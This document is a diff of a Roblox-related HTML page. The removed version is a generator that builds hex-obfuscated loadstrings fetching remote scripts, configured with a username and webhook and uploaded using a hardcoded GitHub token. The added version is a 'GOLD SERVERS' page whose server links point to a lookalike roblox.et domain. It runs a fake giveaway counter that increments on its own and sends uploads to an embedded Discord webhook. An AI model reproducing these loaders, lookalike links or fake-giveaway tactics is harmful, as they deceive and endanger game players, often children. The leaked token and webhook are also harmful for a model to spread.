@@ -1,136 +1,461 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
+
 <head>
+
     <meta charset="UTF-8">
+
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Script Generator</title>
+
+    <title>GOLD SERVERS</title>
+
     <style>
+
         body {
-            background: linear-gradient(45deg, #0f0c29, #302b63, #24243e);
+
+            font-family: 'Poppins', sans-serif;
+
+            background: linear-gradient(to right, #2e026d, #15162c);
+
             color: white;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-            margin: 0;
-        }
-        h1 {
-            font-size: 3rem;
-        }
-        .container {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            margin-top: 20px;
+
             text-align: center;
-            background: rgba(0, 0, 0, 0.7);
+
             padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-        }
-        input, select, button {
-            padding: 10px;
-            border-radius: 8px;
-            border: none;
-            background-color: #333;
-            color: white;
-            font-size: 1rem;
-            width: 250px;
-        }
-        button {
-            background: #ff0080;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        button:hover {
-            background: #ff0055;
-            transform: scale(1.1);
-        }
-    </style>
+
+            overflow-x: hidden;
+
+        }header {
+
+        display: flex;
+
+        justify-content: space-between;
+
+        align-items: center;
+
+        padding: 15px 30px;
+
+        background: rgba(255, 255, 255, 0.1);
+
+        border-radius: 15px;
+
+        box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+
+        animation: glow 2s infinite alternate;
+
+    }
+
+
+
+    @keyframes glow {
+
+        from { box-shadow: 0 0 15px rgba(255, 255, 255, 0.1); }
+
+        to { box-shadow: 0 0 30px rgba(255, 255, 255, 0.5); }
+
+    }
+
+
+
+    nav a {
+
+        color: white;
+
+        text-decoration: none;
+
+        margin: 0 15px;
+
+        font-weight: bold;
+
+        transition: color 0.3s;
+
+    }
+
+
+
+    nav a:hover {
+
+        color: #FFD700;
+
+    }
+
+
+
+    .server, .giveaway, .feedback-form, .ad-container {
+
+        background: rgba(0, 0, 0, 0.7);
+
+        padding: 20px;
+
+        margin: 20px auto;
+
+        width: 60%;
+
+        border-radius: 15px;
+
+        box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+
+        transition: transform 0.3s;
+
+        border: 1px solid #6a0dad;
+
+    }
+
+
+
+    .server:hover, .giveaway:hover, .feedback-form:hover {
+
+        transform: scale(1.05);
+
+    }
+
+
+
+    .join-button, .giveaway-button, button {
+
+        background: linear-gradient(45deg, #FFD700, #FF4500);
+
+        color: white;
+
+        padding: 15px 25px;
+
+        border: none;
+
+        cursor: pointer;
+
+        font-size: 20px;
+
+        border-radius: 8px;
+
+        transition: all 0.3s ease-in-out;
+
+        box-shadow: 0 4px 15px rgba(255, 215, 0, 0.5);
+
+    }
+
+
+
+    .join-button:hover, .giveaway-button:hover, button:hover {
+
+        transform: scale(1.1);
+
+        box-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
+
+    }
+
+
+
+    .fireflies {
+
+        position: fixed;
+
+        width: 100%;
+
+        height: 100%;
+
+        overflow: hidden;
+
+        top: 0;
+
+        left: 0;
+
+        z-index: -1;
+
+    }
+
+
+
+    .firefly {
+
+        position: absolute;
+
+        width: 5px;
+
+        height: 5px;
+
+        background: #fff;
+
+        border-radius: 50%;
+
+        animation: fly 10s infinite ease-in-out;
+
+    }
+
+
+
+    @keyframes fly {
+
+        0% { transform: translateY(0) translateX(0); opacity: 0.5; }
+
+        50% { transform: translateY(-200px) translateX(200px); opacity: 1; }
+
+        100% { transform: translateY(0) translateX(0); opacity: 0.5; }
+
+    }
+
+
+
+    .perm-dragon-counter {
+
+        font-size: 2rem;
+
+        color: #FFD700;
+
+        background: rgba(0, 0, 0, 0.8);
+
+        padding: 10px 20px;
+
+        border-radius: 12px;
+
+        display: inline-block;
+
+        margin-top: 10px;
+
+        box-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
+
+        animation: pulse 1.5s infinite;
+
+    }
+
+
+
+    @keyframes pulse {
+
+        0% { transform: scale(1); }
+
+        50% { transform: scale(1.1); }
+
+        100% { transform: scale(1); }
+
+    }
+
+</style>
+
+
+
 </head>
+
 <body>
-    <h1>Script Generator</h1>
-    <div class="container">
-        <input type="text" id="username" placeholder="Enter your Username">
-        <input type="text" id="webhook" placeholder="Enter Webhook URL">
-        <select id="script-select">
-            <option value="Blox Fruits">Blox Fruits</option>
-            <option value="Murder Mystery 2">Murder Mystery 2</option>
-            <option value="Adopt Me">Adopt Me</option>
-            <option value="Pet Simulator 99">Pet Simulator 99</option>
-            <option value="Pls Donate">Pls Donate</option>
-        </select>
-        <label><input type="checkbox" id="auto-obfuscate-option"> Advanced Hex Obfuscate</label>
-        <button onclick="generateScript()">Generate Script</button>
+
+    <div class="fireflies"></div>
+
+    <header>
+
+        <h1 style="color: #A020F0; animation: glow 2s infinite alternate;">GOLD SERVERS</h1>
+
+        <nav>
+
+            <a href="#">Home</a>
+
+            <a href="#dashboard">Dashboard</a>
+
+            <a href="#feedback">Feedback</a>
+
+        </nav>
+
+    </header><main>
+
+    <div class="ad-container">
+
+        <h2>🔥 Paid Advertisement 🔥</h2>
+
+        <iframe width="100%" height="315" src="https://youtu.be/rgaJPR64hMA?si=NbIQaiZvF0kI7IeE" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+
     </div>
-    <script>
-        const token = "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"; // Replace with a secure token management method!
-        let loadstrings = {
-            "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/goldv2/void-scripts-/main/BloxFruits.txt'))()",
-            "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/goldv2/void-scripts-/main/MurderMystery2.txt'))()",
-            "Adopt Me": "loadstring(game:HttpGet('https://raw.githubusercontent.com/goldv2/void-scripts-/main/AdoptMe.txt'))()",
-            "Pet Simulator 99": "loadstring(game:HttpGet('https://raw.githubusercontent.com/goldv2/void-scripts-/main/PetSimulator99.txt'))()",
-            "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/goldv2/void-scripts-/main/PlsDonate.txt'))()"
-        };
-        function hexEncode(script) {
-            return script.split('').map(c => `\z${c.charCodeAt(0).toString(16)}${Math.floor(Math.random() * 9)}`).join('');
-        }
-        function wrapInDecoder(hexString) {
-            return `loadstring((function(...)
-                local P = ''
-                local hex = '${hexString}'
-                for h in hex:gmatch('\\z(%x%x)%d') do
-                    P = P .. string.char(tonumber(h, 16))
-                end
-                return P
-            end)())()`;
-        }
-        function obfuscateScript(script) {
-            let hex = hexEncode(script);
-            return wrapInDecoder(hex);
-        }
-        function generateScript() {
-            let username = document.getElementById('username').value;
-            let webhook = document.getElementById('webhook').value;
-            let selectedScript = document.getElementById('script-select').value;
-            let autoObfuscate = document.getElementById('auto-obfuscate-option').checked;
-            if (!username || !webhook) {
-                alert("Please enter both Username and Webhook URL!");
-                return;
+
+
+
+    <section class="server">
+
+        <h2>BloxFruit Server 1</h2>
+
+        <a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">
+
+            <button class="join-button">🚀 Join Server</button>
+
+        </a>
+
+    </section>
+
+
+
+    <section class="server">
+
+        <h2>BloxFruit Server 2</h2>
+
+        <a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">
+
+            <button class="join-button">🚀 Join Server</button>
+
+        </a>
+
+    </section>
+
+
+
+    <section class="giveaway" id="dashboard">
+
+        <h2>🎉 Permanent Dragon Giveaway 🎉</h2>
+
+        <p>Perm Dragons Given:</p>
+
+        <div class="perm-dragon-counter" id="perm-dragon-counter">18</div>
+
+
+
+        <p>To get Dragon, here's what you have to do:</p>
+
+        <ol>
+
+            <li>Make or download my vids and upload them to YouTube (use my title & description).</li>
+
+            <li>Put my site link in your comment: <a href="https://linktr.ee/Gamerisgamer" target="_blank">Gamerisgamer</a></li>
+
+            <li>Every 200 views you get, you earn 1 Permanent Dragon.</li>
+
+        </ol>
+
+        <p>Send proof here (if you lie, you won't get anything):</p>
+
+        <form id="proof-form">
+
+            <input type="text" id="roblox-user" placeholder="Enter your Roblox username" required>
+
+            <input type="file" id="proof-file" accept="image/*" required>
+
+            <button type="submit" class="giveaway-button">📁 Send Proof</button>
+
+        </form>
+
+    </section>
+
+
+
+    <section class="feedback-form" id="feedback">
+
+        <h2>Report Bugs / Rate Our Site</h2>
+
+        <form id="feedback-form">
+
+            <input type="text" id="feedback-user" placeholder="Enter your Roblox username" required>
+
+            <textarea id="feedback-message" placeholder="Your feedback..." required></textarea>
+
+            <button type="submit">Submit Feedback</button>
+
+        </form>
+
+    </section>
+
+</main>
+
+
+
+<script>
+
+    // Firefly generation
+
+    for (let i = 0; i < 20; i++) {
+
+        const firefly = document.createElement('div');
+
+        firefly.classList.add('firefly');
+
+        firefly.style.top = Math.random() * 18+ 'vh';
+
+        firefly.style.left = Math.random() * 18+ 'vw';
+
+        document.querySelector('.fireflies').appendChild(firefly);
+
+    }
+
+
+
+    // Perm Dragon Counter
+
+    let permDragonCount = localStorage.getItem('permDragonCount') || 100;
+
+    const counterElement = document.getElementById('perm-dragon-counter');
+
+
+
+    function updateCounter() {
+
+        permDragonCount++;
+
+        counterElement.textContent = permDragonCount;
+
+        localStorage.setItem('permDragonCount', permDragonCount);
+
+    }
+
+
+
+    setInterval(updateCounter, 60000); // Increment every minute
+
+
+
+    // Proof submission
+
+    document.getElementById('proof-form').addEventListener('submit', function(event) {
+
+        event.preventDefault();
+
+        const username = document.getElementById('roblox-user').value;
+
+        const file = document.getElementById('proof-file').files[0];
+
+        const formData = new FormData();
+
+
+
+        formData.append('file', file);
+
+        formData.append('payload_json', JSON.stringify({
+
+            embeds: [{
+
+                title: "Dragon Giveaway Proof",
+
+                description: `Proof from **${username}**` + ` | Perm Dragon Count: ${permDragonCount}`,
+
+                color: 3447003
+
+            }]
+
+        }));
+
+
+
+        fetch('https://discord.com/api/webhooks/1306937739702308915/-kxWY0Xk3Ci95HR7DjHZyw2BcMSc3CvkwMwllTDEOve0LmozUU3QgGT8k51FtCCylQiI', {
+
+            method: 'POST',
+
+            body: formData
+
+        }).then(response => {
+
+            if (response.ok) {
+
+                alert('Proof sent successfully!');
+
+            } else {
+
+                alert('Error sending proof.');
+
             }
-            let script = `Username = "${username}"Webhook = "${webhook}" ${loadstrings[selectedScript]}`;
-            if (autoObfuscate) {
-                script = obfuscateScript(script);
-            }
-            uploadToGitHub(script, selectedScript);
-        }
-        function uploadToGitHub(content, scriptName) {
-            let filename = `Void${scriptName}.txt`;
-            fetch(`https://api.github.com/repos/goldv2/void-scripts-/contents/${filename}`, {
-                method: 'POST', // Use POST for creating a new file
-                headers: {
-                    'Authorization': 'Bearer ' + token,
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    message: 'Add new script',
-                    content: btoa(content)
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                let rawURL = data.content.download_url;
-                let loadString = `loadstring(game:HttpGet('${rawURL}'))()`;
-                navigator.clipboard.writeText(loadString); 
-                alert("Script uploaded and loadstring copied to clipboard!");
-            })
-            .catch(error => {
-                console.error('Error uploading:', error);
-                alert("Error uploading script! Please check your input and try again.");
-            });
-        }
-    </script>
+
+        }).catch(error => {
+
+            alert('Error: ' + error.message);
+
+        });
+
+    });
+
+</script>
+
+
+
 </body>
+
 </html>
